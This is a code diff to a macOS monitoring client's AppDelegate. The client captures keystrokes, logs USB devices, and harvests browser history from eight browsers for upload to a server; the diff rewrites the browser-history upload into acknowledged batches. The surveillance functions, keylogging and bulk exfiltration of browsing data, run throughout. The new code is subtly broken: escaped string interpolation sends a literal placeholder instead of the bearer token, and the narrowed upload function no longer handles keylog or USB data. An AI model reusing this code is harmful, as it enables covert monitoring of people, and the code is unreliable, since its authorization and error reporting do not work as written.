@@ -461,6 +461,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     var keyLogs: [KeyLog]!
     private var keyboardUploadInProgress = false
     private var usbUploadInProgress = false
+    private var browserUploadInProgress = false
     var usbDeviceLogs: [USBDeviceLog]!
     var usbNotificationPort: IONotificationPortRef?
     var usbAddedIterator: io_iterator_t = 0
@@ -1897,37 +1898,64 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     }
     
     @objc func sendBrowserHistories() {
-        logMonitoringEvent("Starting browser history collection", details: "Checking all supported browsers")
-        
-        var browserHistories: [BrowserHistoryLog] = []
-        do {
-            browserHistories = try getBrowserHistories() ?? []
-            // logMessage("Browser history collection completed: \(browserHistories.count) entries found", level: .info)
-            
-            // If no entries found, log debug info
-            if browserHistories.count == 0 {
-            }
-        } catch {
-            logError("Error reading browser history: \(error)", context: "BrowserHistory")
+        // Browser checkpoint state and upload decisions are owned by the main
+        // queue; disk-heavy browser SQLite collection happens off the UI.
+        if !Thread.isMainThread {
+            DispatchQueue.main.async { [weak self] in self?.sendBrowserHistories() }
             return
         }
-        
-        if (browserHistories.count > 0) {
-            // logMessage("Sending \(browserHistories.count) browser history entries to server", level: .info)
-            
-            // Log a sample of the histories for debugging
-            let sampleCount = min(3, browserHistories.count)
-            for i in 0..<sampleCount {
-                let history = browserHistories[i]
-                logMessage("Sample history \(i+1): \(history.browser) - \(history.url)", level: .debug)
+        guard !browserUploadInProgress else { return }
+        guard !clientToken.isEmpty && selectedMonitorId > 0 else { return }
+        browserUploadInProgress=true
+        let previous=(safariChecked,chromeChecked,firefoxChecked,edgeChecked,
+                      operaChecked,yandexChecked,vivaldiChecked,braveChecked)
+        DispatchQueue.global(qos:.utility).async { [weak self] in
+            guard let self=self else {return}
+            let records: [BrowserHistoryLog]
+            do {
+                records=try self.getBrowserHistories() ?? []
+            } catch {
+                DispatchQueue.main.async {
+                    self.browserUploadInProgress=false
+                    self.logError("Browser history collection failed: \\(error)",context:"BrowserHistory")
+                }
+                return
             }
-            
-            // Send data in chunks
-            sendDataInChunks(data: browserHistories, eventType: "BrowserHistory", chunkSize: 1000)
-            lastBrowserHistorySent = Date()
-            logSuccess("Browser history data sent to server", details: "\(browserHistories.count) entries")
-        } else {
-            // logMessage("No browser history entries found to send. This may be normal if no new history since last check.", level: .info)
+            let collected=(self.safariChecked,self.chromeChecked,self.firefoxChecked,self.edgeChecked,
+                           self.operaChecked,self.yandexChecked,self.vivaldiChecked,self.braveChecked)
+            DispatchQueue.main.async {
+                // Collection itself must not advance the committed cursor:
+                // a failed HTTP request otherwise loses browser history.
+                self.safariChecked=previous.0
+                self.chromeChecked=previous.1
+                self.firefoxChecked=previous.2
+                self.edgeChecked=previous.3
+                self.operaChecked=previous.4
+                self.yandexChecked=previous.5
+                self.vivaldiChecked=previous.6
+                self.braveChecked=previous.7
+                if records.isEmpty {
+                    self.browserUploadInProgress=false
+                    return
+                }
+                self.sendDataInChunks(data:records,eventType:"BrowserHistory",chunkSize:500) { ok in
+                    if ok {
+                        self.safariChecked=collected.0
+                        self.chromeChecked=collected.1
+                        self.firefoxChecked=collected.2
+                        self.edgeChecked=collected.3
+                        self.operaChecked=collected.4
+                        self.yandexChecked=collected.5
+                        self.vivaldiChecked=collected.6
+                        self.braveChecked=collected.7
+                        self.lastBrowserHistorySent=Date()
+                        self.logMessage("Browser history batch acknowledged by server",level:.info)
+                    }else{
+                        self.logError("Browser history upload failed; collection cursors retained for retry",context:"BrowserHistory")
+                    }
+                    self.browserUploadInProgress=false
+                }
+            }
         }
     }
 
@@ -2512,7 +2540,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
             callback: handleKeyDownCallback,
             userInfo: UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
         ) else {
-            debugPrint("Failed to create event tap")
+            logError("Keyboard capture could not start. Check Accessibility and Input Monitoring permissions for MonitorClient in System Settings.", context: "Keyboard")
             return
         }
         
@@ -4028,155 +4056,74 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     }
 
 
-    private func sendDataInChunks(data: [Any], eventType: String, chunkSize: Int = 1000) {
-        guard !clientToken.isEmpty && selectedMonitorId > 0 else { return }
-        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
-            logError("Failed to build endpoint for \(eventType)", context: eventType)
-            DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
+    // Sequential browser-history upload, with a complete database
+    // acknowledgement required before collection cursors can advance.
+    private func sendDataInChunks(data: [Any], eventType: String, chunkSize: Int = 500,
+                                  completion: @escaping (Bool) -> Void) {
+        guard eventType=="BrowserHistory", !clientToken.isEmpty,selectedMonitorId>0,
+              let endpoint=buildEndpoint(false),let url=URL(string:endpoint) else {
+            completion(false)
             return
         }
-        
-        // logMessage("=== Sending \(eventType) Data ===", level: .info)
-        // logMessage("Endpoint: \(urlString)", level: .info)
-        // logMessage("Total data items: \(data.count)", level: .info)
-        
-        // Create chunks properly
-        var chunks: [[Any]] = []
-        for i in stride(from: 0, to: data.count, by: chunkSize) {
-            let endIndex = min(i + chunkSize, data.count)
-            let chunk = Array(data[i..<endIndex])
-            chunks.append(chunk)
+        let records=data.compactMap { $0 as? BrowserHistoryLog }
+        guard records.count==data.count else { completion(false);return }
+        guard !records.isEmpty else { completion(true);return }
+        let size=max(1,min(chunkSize,500))
+        let batches=stride(from:0,to:records.count,by:size).map {
+            Array(records[$0..<min($0+size,records.count)])
         }
-        
-        logMonitoringEvent("Sending \(eventType) data", details: "\(chunks.count) chunks of \(chunkSize) items each")
-        
-        for (index, chunk) in chunks.enumerated() {
-            let chunkData = chunk
-            
-            // Get username from settings
-            let username = storage.string(forKey: "username") ?? NSUserName()
-            
-            // Use the correct field name for each data type (matching Windows format)
-            var postData: [String: Any] = [
-                "Event": eventType,
-                "MonitorId": selectedMonitorId,
-                "Version": APP_VERSION,
-                "MacAddress": macAddress,
-                "Username": username
+        let token=clientToken,monitor=selectedMonitorId
+        func upload(_ index:Int) {
+            guard index<batches.count else { completion(true);return }
+            guard self.clientToken==token,self.selectedMonitorId==monitor else {
+                completion(false)
+                return
+            }
+            let batch=batches[index]
+            let history:[[String:Any]]=batch.map { item in
+                ["browser":item.browser,"url":item.url,"title":item.title,
+                 "last_visit":item.last_visit,"date":item.date]
+            }
+            let payload:[String:Any]=[
+                "Event":"BrowserHistory",
+                "MonitorId":monitor,
+                "Version":APP_VERSION,
+                "MacAddress":self.macAddress,
+                "BrowserHistories":history
             ]
-
-            // Convert Swift structs to dictionaries (matching Windows JSON format)
-                switch eventType {
-                case "BrowserHistory":
-                let historyArray = chunkData.map { (item: Any) -> [String: Any] in
-                    if let history = item as? BrowserHistoryLog {
-                        return [
-                            "browser": history.browser,
-                            "url": history.url,
-                            "title": history.title,
-                            "last_visit": history.last_visit,
-                            "date": history.date
-                        ]
-                    }
-                    return [:]
-                }
-                postData["BrowserHistories"] = historyArray
-                
-                case "KeyLog":
-                let keyLogArray = chunkData.map { (item: Any) -> [String: Any] in
-                    if let keyLog = item as? KeyLog {
-                        return [
-                            "date": keyLog.date,
-                            "application": keyLog.application,
-                            "key": keyLog.key
-                        ]
-                    }
-                    return [:]
-                }
-                postData["KeyLogs"] = keyLogArray
-                
-                case "USBLog":
-                let usbLogArray = chunkData.map { (item: Any) -> [String: Any] in
-                    if let usbLog = item as? USBDeviceLog {
-                        return [
-                            "date": usbLog.date,
-                            "device_name": usbLog.device_name,
-                            "device_path": usbLog.device_path,
-                            "device_type": usbLog.device_type,
-                            "action": usbLog.action
-                        ]
-                    }
-                    return [:]
-                }
-                postData["USBLogs"] = usbLogArray
-                
-                default:
-                    postData["Data"] = chunkData
-                }
-
-                logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) data prepared", level: .debug)
-                
-                // Convert to JSON
-                guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
-                    logError("Failed to serialize JSON data for \(eventType) chunk \(index + 1)", context: eventType)
-                    continue
-                }
-                
-                // Create request
-                var request = URLRequest(url: url)
-                request.httpMethod = "POST"
-                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-                request.setValue("Bearer \(clientToken)", forHTTPHeaderField: "Authorization")
-            request.setValue("MonitorClient/\(APP_VERSION)", forHTTPHeaderField: "User-Agent")
-            request.timeoutInterval = 30.0
-                request.httpBody = jsonData
-                
-                logMessage("Sending \(eventType) chunk \(index + 1)/\(chunks.count) to: \(urlString)", level: .debug)
-            logMessage("Request body size: \(jsonData.count) bytes", level: .debug)
-            logMessage("Authorization headers redacted", level: .debug)
-            
-            // Log the actual JSON being sent for debugging
-            logMessage("Request body: \(jsonData.count) bytes (redacted)", level: .debug)
-                
-                // Send request
-                let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
-                    DispatchQueue.main.async {
-                        if let error = error {
-                            self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) network error: \(error)", context: eventType)
-                            self?.logError("Error details: \(error.localizedDescription)", context: eventType)
-                            self?.isServerConnected = false // Mark as disconnected on network error
-                            return
-                        }
-                        
-                        if let httpResponse = response as? HTTPURLResponse {
-                            self?.logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP response: \(httpResponse.statusCode)", level: .debug)
-                        self?.logMessage("Response headers: \(httpResponse.allHeaderFields)", level: .debug)
-                        
-                        if httpResponse.statusCode != 200 {
-                            self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP error: \(httpResponse.statusCode)", context: eventType)
-                            self?.isServerConnected = false
-                            return
-                        }
-                        }
-                        
-                        if let data = data, let responseString = String(data: data, encoding: .utf8) {
-                            self?.logSuccess("\(eventType) chunk \(index + 1)/\(chunks.count) sent successfully", details: "Response: \(responseString)")
-                            self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
-                            self?.isServerConnected = true
-                        } else {
-                            self?.logError("No response data received for \(eventType) chunk \(index + 1)/\(chunks.count)", context: eventType)
-                            if let data = data {
-                                self?.logMessage("Raw response data: \(data)", level: .debug)
-                            }
-                        }
+            guard let body=try? JSONSerialization.data(withJSONObject:payload) else {
+                completion(false)
+                return
+            }
+            var request=URLRequest(url:url)
+            request.httpMethod="POST"
+            request.timeoutInterval=30
+            request.setValue("application/json",forHTTPHeaderField:"Content-Type")
+            request.setValue("Bearer \\(token)",forHTTPHeaderField:"Authorization")
+            request.setValue("MonitorClient/\\(APP_VERSION)",forHTTPHeaderField:"User-Agent")
+            request.httpBody=body
+            URLSession.shared.dataTask(with:request){[weak self] data,response,error in
+                DispatchQueue.main.async {
+                    guard let self=self else {return}
+                    let status=(response as? HTTPURLResponse)?.statusCode ?? 0
+                    let json=(data.flatMap{try? JSONSerialization.jsonObject(with:$0)}) as? [String:Any]
+                    let accepted=status==200 && (json?["status"] as? String)=="success"
+                    let stored=((json?["data"] as? [String:Any])?["inserted_count"] as? Int) ?? 0
+                    if accepted && stored==batch.count {
+                        upload(index+1)
+                    }else{
+                        let reason=(json?["error"] as? String) ?? error?.localizedDescription ??
+                            "HTTP \\(status), stored \\(stored)/\\(batch.count)"
+                        self.logError("Browser batch \\(index+1)/\\(batches.count): \\(reason)",
+                                      context:"BrowserHistory")
+                        completion(false)
                     }
                 }
-                task.resume()
+            }.resume()
         }
-                
-        // logMessage("=== End Sending \(eventType) Data ===", level: .info)
+        upload(0)
     }
-    
+
     // Helper function to generate random string
     private func generateRandomString(length: Int) -> String {
         let characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
